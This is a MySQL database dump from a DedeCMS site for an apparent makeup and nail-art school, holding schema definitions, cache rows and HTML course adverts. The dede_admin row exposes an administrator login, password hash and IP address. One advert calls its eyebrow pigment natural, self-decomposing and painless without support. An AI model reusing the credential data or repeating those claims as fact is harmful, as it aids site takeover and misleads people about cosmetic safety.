INSERT INTO dede_addonarticle17 VALUES ('107', '13', '尖端化妆、美甲精英班<br />\r\n课程内容：基础化妆+影楼化妆+时尚创意妆+礼服搭配+基础美甲+尖端美甲+美甲店面营销管理课程<br />\r\n学期：4个半月&nbsp;&nbsp;&nbsp;&nbsp;学费：原价：7940 &nbsp; &nbsp; &nbsp; 优惠价：3980元<br />\r\n（赠送美甲工具及产品）<br />\r\n&nbsp;<br />\r\n每月报名前10名学员可赠送价值：3040元（韩式嫁接睫毛、烫睫毛课程＋店面管理课程，名额有限，报满截止）<br />\r\n&nbsp;<br />\r\n上课时间：周一至周五&nbsp;AM9：00&mdash;&mdash;12&nbsp;：00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PM：14：00&mdash;&mdash;17：00<br />\r\n&nbsp;<br />\r\n招生对象：无基础的化妆、美甲爱好者、行业精英两栖人才、高端项目创业开店的人员、精品沙龙经营管理者。<br />\r\n<img alt=\"\" src=\"/uploads/150422/1-1504221H51S18.jpg\" /><br />\r\n<img alt=\"\" src=\"/uploads/150422/1-1504221H541405.jpg\" />\r\n<div>\r\n	<span style=\"color:#000000;\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;此课程针对致力于化妆美甲事业的开店创业的学员，针对市场对高端需求制定课程。有无基础均可报名，无年龄限制因材施教。<br />\r\n	通过数个常用妆面造型课程为学员打下扎实的化妆功底；通过解析国内、国际流行趋势和流行时尚造型，开拓学员造型思维；培养学<br />\r\n	员独立的创作意识和创作能力。整个课程，融入了新理念，新技巧，也融入了化妆造型的历史文化知识，力求培养高素质，高技巧的<br />\r\n	全面造型人才。了解日韩欧美时尚造型的概念以及运用，突出课程的实用性、结合市场需求及流行趋势、教授流行时尚元素妆容与技<br />\r\n	巧。各种新娘妆妆容设计以及白纱、鲜花、饰品搭配技巧、以及各种场合的礼服选择与搭配。综合现在的市场彩妆流行趋势，紧跟时<br />\r\n	尚潮流。让学员能独立且熟练操作自身作品的展示能力。培养出高能力的应用性人才。美甲课程：主要教授现在美甲行业最实用的技<br />\r\n	术和最时尚的款型，结合市场的实用简单，花式新颖,注重花样技术实用性,逐步升级到学习欧美流行的彩色水晶甲和花式光疗指甲，<br />\r\n	简单易学，容易掌握；全面的学习日韩流行的3D彩绘、3D雕艺、课程内容打破了传统美甲技术的单一和复杂，提升美甲花样的设计<br />\r\n	和变化,操作更加简单,款式深受现代女性的喜爱。包教包会，从理论到实操全面的美甲技术。同时增加经营管理课程让学员迅速提高<br />\r\n	管理能力的捷径，美甲店如何选址，美甲店产品渠道选择，美甲店的常态管理，美甲店人力资源管理，开卡技巧、奖惩机制、薪酬制<br />\r\n	定、业绩考核、美甲店淡季营业额猛增的策略。</span></div>\r\n', '', '', '182.151.165.30', '8800', '20', '6', '5800');
INSERT INTO dede_addonarticle17 VALUES ('123', '12', '<div>\r\n	<span style=\"font-size:22px;\"><span style=\"font-size:16px;\">课程5-7天，价格原价2980.特价2680（赠送全套学习用品用具及色料和学习机）</span></span></div>\r\n<div>\r\n	<span style=\"font-size:16px;\"><span style=\"font-size:20px;\"><span style=\"color:#ffffff;\"><span style=\"background-color:#ff66cc;\">课程优势</span></span></span>：名师授课，一次报名。终身免复训全套技术安全，高效，无痛，不肿学员零基础，可达到纹绣师水平。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150525/1-150525131326258.jpg\" style=\"text-align: center; height: 477px; width: 486px;\" /></div>\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n<div>\r\n	<span style=\"font-size:16px;\">&nbsp; 在韩国，几乎每个女孩子都会做半永久化妆，区别于国内的纹绣， 韩国半永久裸妆可以让您更完美！韩式定妆眉后期呈现眉粉刷过的清淡感觉，是中国式纹绣难以达到淡妆效果！中国纹绣的着色在真皮层，所以难分解，几年后就变蓝或者红，难以洗掉，而韩式定妆眉不是纹眉，也不是绣眉，是来自韩国的定妆技术！它的着色层只在表皮层，色料纯天然纳米级可自体分解！故可在几年后自然褪去，便于改变眉形追随潮流。韩式定妆眉的出现，让您不出国门就可以体验到自然的半永久定妆技术！</span></div>\r\n<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150525/1-150525131110940.JPG\" style=\"width: 486px; height: 719px;\" /><br />\r\n	&nbsp;</div>\r\n', '', '', '171.221.133.112', '2980', '20', '5', '2680');

-- ----------------------------
-- Table structure for `dede_addonimages`
-- ----------------------------
DROP TABLE IF EXISTS `dede_addonimages`;
CREATE TABLE `dede_addonimages` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pagestyle` smallint(6) NOT NULL DEFAULT '1',
  `maxwidth` smallint(6) NOT NULL DEFAULT '600',
  `imgurls` text,
  `row` smallint(6) NOT NULL DEFAULT '0',
  `col` smallint(6) NOT NULL DEFAULT '0',
  `isrm` smallint(6) NOT NULL DEFAULT '0',
  `ddmaxwidth` smallint(6) NOT NULL DEFAULT '200',
  `pagepicnum` smallint(6) NOT NULL DEFAULT '12',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `body` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `imagesMain` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_addonimages
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_addoninfos`
-- ----------------------------
DROP TABLE IF EXISTS `dede_addoninfos`;
CREATE TABLE `dede_addoninfos` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `channel` smallint(6) NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `click` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `litpic` varchar(60) NOT NULL DEFAULT '',
  `userip` varchar(15) NOT NULL DEFAULT ' ',
  `senddate` int(11) NOT NULL DEFAULT '0',
  `flag` set('c','h','p','f','s','j','a','b') DEFAULT NULL,
  `lastpost` int(10) unsigned NOT NULL DEFAULT '0',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `goodpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `badpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `nativeplace` smallint(5) unsigned NOT NULL DEFAULT '0',
  `infotype` char(20) NOT NULL DEFAULT '0',
  `body` mediumtext,
  `endtime` int(11) NOT NULL DEFAULT '0',
  `tel` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `address` varchar(100) NOT NULL DEFAULT '',
  `linkman` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`,`nativeplace`,`infotype`) USING BTREE,
  KEY `channel` (`channel`,`arcrank`,`mid`,`click`,`title`,`litpic`,`senddate`,`flag`,`endtime`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_addoninfos
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_addonshop`
-- ----------------------------
DROP TABLE IF EXISTS `dede_addonshop`;
CREATE TABLE `dede_addonshop` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `price` float NOT NULL DEFAULT '0',
  `trueprice` float NOT NULL DEFAULT '0',
  `brand` varchar(250) NOT NULL DEFAULT '',
  `units` varchar(250) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL,
  `userip` char(15) NOT NULL,
  `redirecturl` varchar(255) NOT NULL,
  `vocation` char(20) NOT NULL DEFAULT '0',
  `infotype` char(20) NOT NULL DEFAULT '0',
  `uptime` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_addonshop
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_addonsoft`
-- ----------------------------
DROP TABLE IF EXISTS `dede_addonsoft`;
CREATE TABLE `dede_addonsoft` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `filetype` varchar(10) NOT NULL DEFAULT '',
  `language` varchar(10) NOT NULL DEFAULT '',
  `softtype` varchar(10) NOT NULL DEFAULT '',
  `accredit` varchar(10) NOT NULL DEFAULT '',
  `os` varchar(30) NOT NULL DEFAULT '',
  `softrank` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `officialUrl` varchar(30) NOT NULL DEFAULT '',
  `officialDemo` varchar(50) NOT NULL DEFAULT '',
  `softsize` varchar(10) NOT NULL DEFAULT '',
  `softlinks` text,
  `introduce` text,
  `daccess` smallint(5) NOT NULL DEFAULT '0',
  `needmoney` smallint(5) NOT NULL DEFAULT '0',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `softMain` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_addonsoft
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_addonspec`
-- ----------------------------
DROP TABLE IF EXISTS `dede_addonspec`;
CREATE TABLE `dede_addonspec` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `note` text,
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_addonspec
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_admin`
-- ----------------------------
DROP TABLE IF EXISTS `dede_admin`;
CREATE TABLE `dede_admin` (
  `id` int(10) unsigned NOT NULL,
  `usertype` float unsigned DEFAULT '0',
  `userid` char(30) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `uname` char(20) NOT NULL DEFAULT '',
  `tname` char(30) NOT NULL DEFAULT '',
  `email` char(30) NOT NULL DEFAULT '',
  `typeid` text,
  `logintime` int(10) unsigned NOT NULL DEFAULT '0',
  `loginip` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_admin
-- ----------------------------
INSERT INTO dede_admin VALUES ('1', '10', 'admin', '2e8aeb39d185ff0205e8', 'admin', '', '', '', '1432548933', '171.221.133.112');

-- ----------------------------
-- Table structure for `dede_admintype`
-- ----------------------------
DROP TABLE IF EXISTS `dede_admintype`;
CREATE TABLE `dede_admintype` (
  `rank` float NOT NULL DEFAULT '1',
  `typename` varchar(30) NOT NULL DEFAULT '',
  `system` smallint(6) NOT NULL DEFAULT '0',
  `purviews` text,
  PRIMARY KEY (`rank`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_admintype
-- ----------------------------
INSERT INTO dede_admintype VALUES ('1', '信息发布员', '1', 't_AccList a_AccNew a_AccList a_MyList a_MyEdit a_MyDel sys_MdPwd sys_Feedback sys_MyUpload plus_留言簿模块 ');
INSERT INTO dede_admintype VALUES ('5', '频道管理员', '1', 't_AccList t_AccNew t_AccEdit t_AccDel a_AccNew a_AccList a_AccEdit a_AccDel a_AccCheck a_MyList a_MyEdit a_MyDel a_MyCheck co_AddNote co_EditNote co_PlayNote co_ListNote co_ViewNote spec_New spec_List spec_Edit sys_MdPwd sys_Log sys_ArcTj sys_Source sys_Writer sys_Keyword sys_MakeHtml sys_Feedback sys_Upload sys_MyUpload member_List member_Edit plus_站内新闻发布 plus_友情链接模块 plus_留言簿模块 plus_投票模块 plus_广告管理 ');
INSERT INTO dede_admintype VALUES ('10', '超级管理员', '1', 'admin_AllowAll ');

-- ----------------------------
-- Table structure for `dede_advancedsearch`
-- ----------------------------
DROP TABLE IF EXISTS `dede_advancedsearch`;
CREATE TABLE `dede_advancedsearch` (
  `mid` int(11) NOT NULL,
  `maintable` varchar(256) NOT NULL DEFAULT '',
  `mainfields` text,
  `addontable` varchar(256) DEFAULT NULL,
  `addonfields` text,
  `forms` text,
  `template` varchar(256) NOT NULL DEFAULT '',
  UNIQUE KEY `mid` (`mid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_advancedsearch
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_arcatt`
-- ----------------------------
DROP TABLE IF EXISTS `dede_arcatt`;
CREATE TABLE `dede_arcatt` (
  `sortid` smallint(6) NOT NULL DEFAULT '0',
  `att` char(10) NOT NULL DEFAULT '',
  `attname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`att`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_arcatt
-- ----------------------------
INSERT INTO dede_arcatt VALUES ('5', 's', '滚动');
INSERT INTO dede_arcatt VALUES ('1', 'h', '头条');
INSERT INTO dede_arcatt VALUES ('3', 'f', '幻灯');
INSERT INTO dede_arcatt VALUES ('2', 'c', '推荐');
INSERT INTO dede_arcatt VALUES ('7', 'p', '图片');
INSERT INTO dede_arcatt VALUES ('8', 'j', '跳转');
INSERT INTO dede_arcatt VALUES ('4', 'a', '特荐');
INSERT INTO dede_arcatt VALUES ('6', 'b', '加粗');

-- ----------------------------
-- Table structure for `dede_arccache`
-- ----------------------------
DROP TABLE IF EXISTS `dede_arccache`;
CREATE TABLE `dede_arccache` (
  `md5hash` char(32) NOT NULL DEFAULT '',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `cachedata` mediumtext,
  PRIMARY KEY (`md5hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_arccache
-- ----------------------------
INSERT INTO dede_arccache VALUES ('75889f8eabb53690cea5fa83189e3328', '1432551204', '109');
INSERT INTO dede_arccache VALUES ('4f4531da454bbe2f01ee6fd031c8139e', '1432551204', '102,100,123,103,104,105,92,107,101,95');
INSERT INTO dede_arccache VALUES ('242e5fd1da41a2f85dba5127bae69144', '1432551204', '96');
INSERT INTO dede_arccache VALUES ('2706a9231275002f923ad4692dc743a3', '1432551204', '82,125,126,124,122');
INSERT INTO dede_arccache VALUES ('df7e7f15e1a24ec704740a9b96de9d64', '1432551204', '110,111,2,98,69');
INSERT INTO dede_arccache VALUES ('24e40467c5be25861438f0f36ec9fc97', '1432551204', '82,2,57,81');
INSERT INTO dede_arccache VALUES ('f8a6ff1da7325d4610437958918fcb52', '1432551204', '0');
INSERT INTO dede_arccache VALUES ('2463f2c7ed68b2b0175f468d557fbf7d', '1432551204', '0');
INSERT INTO dede_arccache VALUES ('f9f9abb419cc22d3f6bbf3b00cc44983', '1432551204', '96');
INSERT INTO dede_arccache VALUES ('74982fe83729be2c265471a350bef1f1', '1432551204', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('5486a90e8c034b6063649b0ddeaf68a6', '1432551204', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('c0cf9afda6b08c1ba5c03b62581e0b5d', '1432551204', '119,78,79,118,117,120,121,116,80,77');
INSERT INTO dede_arccache VALUES ('71f83010e96bc05ee27e5018463dee3c', '1432551204', '119,78,79,118,117,120,121,116,80,77');
INSERT INTO dede_arccache VALUES ('776f260f5554fba453c043b3766c3d18', '1432551204', '89,88,58,61,52');
INSERT INTO dede_arccache VALUES ('73d44b34c06f31d4eddfafa1b467c33f', '1432551205', '96');
INSERT INTO dede_arccache VALUES ('9ffb56bcd34cd3522aff0b095f7a1766', '1432551205', '96,108,109');
INSERT INTO dede_arccache VALUES ('680f82f4dfd6d8d6f70c0f941cabf29d', '1432551205', '96');
INSERT INTO dede_arccache VALUES ('d5cc666d96a3aefbb34ad120c756bb54', '1432551206', '129,128,127,48,47,46');
INSERT INTO dede_arccache VALUES ('9caa076f29c925970ad3ee8c27874588', '1432551206', '109');
INSERT INTO dede_arccache VALUES ('27deac5dde1c10a19195ce3abb902979', '1432551206', '102,100,123,103,104,105,92');
INSERT INTO dede_arccache VALUES ('af4e1c4bb16bdfa946d98b31cc1cd37f', '1432551206', '107,93,106');
INSERT INTO dede_arccache VALUES ('651f5a63b3b06ea27ac5dc95545b19b5', '1432551207', '94');
INSERT INTO dede_arccache VALUES ('8170f0929258a169af2f58ed8fd3dec1', '1432551207', '101,95');
INSERT INTO dede_arccache VALUES ('64fc2f64f53f1ddd024e6f83037aea63', '1432551207', '125,126,124,122,110');
INSERT INTO dede_arccache VALUES ('34ce7d0daca96d8e18531e762c715fcd', '1432551207', '111,69,71,73,74,72,70,1');
INSERT INTO dede_arccache VALUES ('3afef140fef3b83da33e334b28d04149', '1432551207', '82,2,57,81');
INSERT INTO dede_arccache VALUES ('1016e4da4a011f81409368a1d720dbdc', '1432551207', '0');
INSERT INTO dede_arccache VALUES ('7128c98a3f236fecd68af77f38390b4d', '1432551207', '0');
INSERT INTO dede_arccache VALUES ('aa8b39ac1f8f8dc6c6fc84f7e204b275', '1432551207', '82,2,57,81');
INSERT INTO dede_arccache VALUES ('ae656a1431d6e49e811d085fb504a60a', '1432551207', '0');
INSERT INTO dede_arccache VALUES ('f8fdf863975f30239d80567cfba89b7e', '1432551207', '82,2,57,81');
INSERT INTO dede_arccache VALUES ('02e55f9f0c273586c8bab0af2dc1ad47', '1432551207', '0');
INSERT INTO dede_arccache VALUES ('18f433ef994024d4eb8d4a11ce9cffcc', '1432551207', '0');
INSERT INTO dede_arccache VALUES ('754814979fb42b2c4b15bb4bbc98d282', '1432551208', '98,91,90,87,86');
INSERT INTO dede_arccache VALUES ('1a721d7086e5fc628ed003e10393d768', '1432551208', '85,51');
INSERT INTO dede_arccache VALUES ('15929c4ca9ca3f21a687df32dd7ebe61', '1432551208', '0');
INSERT INTO dede_arccache VALUES ('6c712c62a532a885007504ea6d8a3c4a', '1432551208', '0');
INSERT INTO dede_arccache VALUES ('924d41f31a98d186e97fa5178518e2b0', '1432551208', '82,2,57,81');
INSERT INTO dede_arccache VALUES ('29900c384e8a7de0f69d176aa02410f1', '1432551208', '0');
INSERT INTO dede_arccache VALUES ('ec465cf46f54c558d4bb7d32c6b5d795', '1432551208', '0');
INSERT INTO dede_arccache VALUES ('50073c3fc7cbee2dc24e48e5ab59a437', '1432551208', '96');
INSERT INTO dede_arccache VALUES ('594b71918c0d9cbb25dd9f165b263768', '1432551208', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('a947c1b59fdddd1c739c1282d27d72ab', '1432551208', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('078d9e3382541441de38f78f52f0691d', '1432551208', '119,78,79,118,117,120,121,116,80,77');
INSERT INTO dede_arccache VALUES ('ced6e3e202c0e0d4279add0f878db1db', '1432551208', '89,88,58,61,52');
INSERT INTO dede_arccache VALUES ('0e86292738d5028e01a56572761b7cd4', '1432551208', '96');
INSERT INTO dede_arccache VALUES ('b2571642362488cb89df5a830d103099', '1432551208', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('b253f1c299ab3f8e8b20a3b3cab2aedc', '1432551208', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('77d4a3fb8f36c37f665180f7d2158c21', '1432551208', '119,78,79,118,117,120,121,116,80,77');
INSERT INTO dede_arccache VALUES ('787d25b3ac8dfbed8dde9fa2dd01ddd2', '1432551208', '89,88,58,61,52');
INSERT INTO dede_arccache VALUES ('6b949b46021c1fad6da97e22494f49f1', '1432551209', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('a775ce41cbcdc0a879ae7ca0ab5cba8e', '1432551209', '59,64,63,60,115,114,113,112,49,62');
INSERT INTO dede_arccache VALUES ('1147ccbab2a65d20b20d8db138b5a283', '1432551209', '119,78,79,118,117,120,121,116,80,77');
INSERT INTO dede_arccache VALUES ('63c7a01e621dd5f7fa22460fb3bc7569', '1432551209', '89,88,58,61,52');
INSERT INTO dede_arccache VALUES ('4c313febee76b1ab2cc2ba02ff248bc3', '1432551209', '96,108,109');
INSERT INTO dede_arccache VALUES ('46c77ec94cb38adc5bb49fb8ac00efca', '1432551209', '96,108,109');
INSERT INTO dede_arccache VALUES ('d85bfc93e996675ed4652eb32a97fb38', '1432551210', '96');
INSERT INTO dede_arccache VALUES ('76181f6f06bb644a839110636b05d939', '1432551210', '96');
INSERT INTO dede_arccache VALUES ('ab8bffafc7a4203831d8fa9a3ed8f341', '1432551211', '96');
INSERT INTO dede_arccache VALUES ('e7c81b74ebcbeaf32eeafd76706524c4', '1432551211', '82,125,126,124,122,110,111,2,98,69');
INSERT INTO dede_arccache VALUES ('a2c0b74cbc3092592b1478773a47f147', '1432551211', '59,60');
INSERT INTO dede_arccache VALUES ('f2e4db6ef645ab7ddec6870f11133bf9', '1432551211', '59,60');
INSERT INTO dede_arccache VALUES ('e3859d2c6eba22a8c6619a2f2eee1d36', '1432551212', '115,114,113,112,62');
INSERT INTO dede_arccache VALUES ('03d2d7f976d3a993b318837301118a2d', '1432551212', '115,114,113,112,62');
INSERT INTO dede_arccache VALUES ('ed78e06c1eb59d8def6395363853f480', '1432551212', '63');
INSERT INTO dede_arccache VALUES ('d11c0091124e360fce064af5dd78a074', '1432551212', '63');
INSERT INTO dede_arccache VALUES ('70e76c48019d71ea1571880495301982', '1432551212', '64,49');
INSERT INTO dede_arccache VALUES ('033adb507251799b8d93cf724e0af989', '1432551212', '64,49');
INSERT INTO dede_arccache VALUES ('1419f9d07e07e25209c29cdf4b3120a9', '1432551212', '96,108,109');
INSERT INTO dede_arccache VALUES ('2a16607905a62a664b8d57288ce6d24e', '1432551213', '99,68');
INSERT INTO dede_arccache VALUES ('a5249cd8fe0515f6b5826f4f4e63bf74', '1432551213', '0');
INSERT INTO dede_arccache VALUES ('60b37f6f01a2b05b9f6eed39e0aabe0f', '1432551213', '82,2,57,81');
INSERT INTO dede_arccache VALUES ('c24b64b41134fc8319ef76ef5e2bff04', '1432551213', '0');
INSERT INTO dede_arccache VALUES ('6a9b766c7156f7aecfce3eb503ceccae', '1432551213', '0');
INSERT INTO dede_arccache VALUES ('ff61969b0a2bb5809c0c3a1c12e7a34a', '1432551483', '109');
INSERT INTO dede_arccache VALUES ('06dae9cac2d53272bfaf5c5053c75aaa', '1432551483', '102,100,123,103');
INSERT INTO dede_arccache VALUES ('554ce28f749482b12b8f81ffb166b120', '1432551483', '107,93,106');
INSERT INTO dede_arccache VALUES ('81b82e543d67464aedfed19f839995c4', '1432551483', '94');
INSERT INTO dede_arccache VALUES ('976a21d178a89f8ba9b1b72de490edc0', '1432551483', '101,95');
INSERT INTO dede_arccache VALUES ('af99b664b2d9e00b284c52751a883cdc', '1432556451', '96');
INSERT INTO dede_arccache VALUES ('9d0d77fe61ed87e66dfabf1b8ab97ad0', '1432556451', '129,128,127,48,47,46');

-- ----------------------------
-- Table structure for `dede_archives`
-- ----------------------------
DROP TABLE IF EXISTS `dede_archives`;
CREATE TABLE `dede_archives` (
  `id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid2` varchar(90) NOT NULL DEFAULT '0',
  `sortrank` int(10) unsigned NOT NULL DEFAULT '0',
  `flag` set('c','h','p','f','s','j','a','b') DEFAULT NULL,
  `ismake` smallint(6) NOT NULL DEFAULT '0',
  `channel` smallint(6) NOT NULL DEFAULT '1',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `click` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `money` smallint(6) NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `shorttitle` char(36) NOT NULL DEFAULT '',
  `color` char(7) NOT NULL DEFAULT '',
  `writer` char(20) NOT NULL DEFAULT '',
  `source` char(30) NOT NULL DEFAULT '',
  `litpic` char(100) NOT NULL DEFAULT '',
  `pubdate` int(10) unsigned NOT NULL DEFAULT '0',
  `senddate` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `keywords` char(30) NOT NULL DEFAULT '',
  `lastpost` int(10) unsigned NOT NULL DEFAULT '0',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `goodpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `badpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `voteid` mediumint(8) NOT NULL,
  `notpost` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `description` varchar(255) NOT NULL DEFAULT '',
  `filename` varchar(40) NOT NULL DEFAULT '',
  `dutyadmin` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `tackid` int(10) NOT NULL DEFAULT '0',
  `mtype` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `weight` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `sortrank` (`sortrank`) USING BTREE,
  KEY `mainindex` (`arcrank`,`typeid`,`channel`,`flag`,`mid`) USING BTREE,
  KEY `lastpost` (`lastpost`,`scores`,`goodpost`,`badpost`,`notpost`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_archives
-- ----------------------------
INSERT INTO dede_archives VALUES ('1', '16', '0', '1429067692', 'p', '1', '1', '0', '198', '0', '群丽化妆老师带领同学们牵手F5.6摄影', '', '', 'admin', '未知', '/uploads/150411/1-1504111A53UP-lp.png', '1429067692', '1428741732', '1', '群丽化妆    F5.6摄影俱乐部', '0', '0', '0', '0', '0', '0', '群丽化妆老师带领同学们牵手F5.6摄影俱乐部会员', '', '1', '0', '0', '0');
INSERT INTO dede_archives VALUES ('37', '12', '0', '1429067687', 'p', '0', '1', '-1', '89', '0', '专业形象设计师培训基础班', '', '', 'admin', '未知', '/uploads/150415/1-150415104141416.jpg', '1429067687', '1429067612', '1', '成都化妆学校  专业设计师培训   化妆师培训', '0', '0', '0', '0', '0', '0', '学期：1个月 \r\n专业形象设计培训基础班\r\n上课时间:周一至周五 AM 10：00-12：00  PM 1：00-17：00\r\n\r\n教学目的：无基础学', '', '1', '0', '0', '29');
INSERT INTO dede_archives VALUES ('2', '17', '0', '1429343881', 'p', '1', '1', '0', '105', '0', '老学员答谢之“美丽课堂”讲座', '', '', 'admin', '未知', '/uploads/150418/1-15041Q55I33O-lp.png', '1429343881', '1428743213', '1', '群丽活动', '0', '0', '0', '0', '0', '0', '老学员答谢之“美丽课堂”讲座', '', '1', '0', '0', '1');
INSERT INTO dede_archives VALUES ('10', '2', '0', '1428895406', 'p', '0', '1', '-1', '99', '0', '专业课程', '', '', 'admin', '未知', '/uploads/150411/1-1504111A53UP-lp.png', '1428895406', '1428894950', '1', '专业课程,专业课程,', '0', '0', '0', '0', '0', '0', '专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专', '', '1', '0', '0', '9');
INSERT INTO dede_archives VALUES ('11', '12', '0', '1429064214', 'p', '0', '1', '-1', '94', '0', '专业形象设计师培训基础班', '', '', 'admin', '未知', '/uploads/150415/1-150415104141416.jpg', '1429064214', '1428895021', '1', '成都化妆学校  专业设计师培训   化妆师培训', '0', '0', '0', '0', '0', '0', '学期：1个月 \r\n专业形象设计培训基础班\r\n上课时间:周一至周五 AM 10：00-12：00  PM 1：00-17：00\r\n\r\n教学目的：无基础学员都可选学，了解化妆的起源与发展，掌握基础化妆理论、认识化妆工具及化', '专业设计师培训基础班', '1', '0', '0', '10');
INSERT INTO dede_archives VALUES ('12', '2', '0', '1428912140', 'p', '0', '17', '-1', '61', '0', '专业课程2', '', '', 'admin', '未知', '/uploads/150411/1-1504111A53UP-lp.png', '1428912140', '1428895891', '1', '专业课程,专业课程,', '0', '0', '0', '0', '0', '0', '专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课程2专业课', '', '1', '0', '0', '11');
INSERT INTO dede_archives VALUES ('22', '22', '0', '1428991581', 'p', '0', '18', '-1', '68', '0', '优秀学员', '', '', 'admin', '未知', '/uploads/150414/1-1504141402041V.png', '1428991581', '1428991330', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '21');
INSERT INTO dede_archives VALUES ('23', '21', '0', '1428993233', 'p', '0', '18', '-1', '51', '0', '作品1', '', '', 'admin', '未知', '/uploads/150414/1-150414143213527.png', '1428993233', '1428993143', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '22');
INSERT INTO dede_archives VALUES ('24', '21', '0', '1428993710', 'p', '0', '18', '-1', '125', '0', '作品2', '', '', 'admin', '未知', '/uploads/150411/1-1504111A53UP.png', '1428993710', '1428993323', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '23');
